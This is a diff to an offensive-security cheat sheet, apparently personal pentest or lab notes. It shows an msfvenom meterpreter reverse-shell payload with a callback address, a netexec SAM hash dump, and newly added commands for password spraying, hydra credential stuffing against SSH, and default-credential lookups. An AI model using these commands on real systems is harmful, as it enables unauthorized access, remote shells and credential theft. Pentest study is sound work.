@@ -211,12 +211,21 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx 
 
 # netexec to dump SAM 
     1. netexec smb [ip] --local-auth -u bob -p [pass] --sam
+```
+
+<br> 
+
+### Password Spraying, stuffing, and defaults 
+```
+# netexec 
+    1. netexec smb [ip]/24 -u list -p 'password' 
 
 
+# Stuffing (Reusing creds from one service on another 
+    1. hydra -c username_and_password.list ssh:[ip]
 
-
-
-
-
-
+# Default creds 
+    1. ~/tools/default creds
+    2. source bin/activate
+    3. creds search ****
 ```
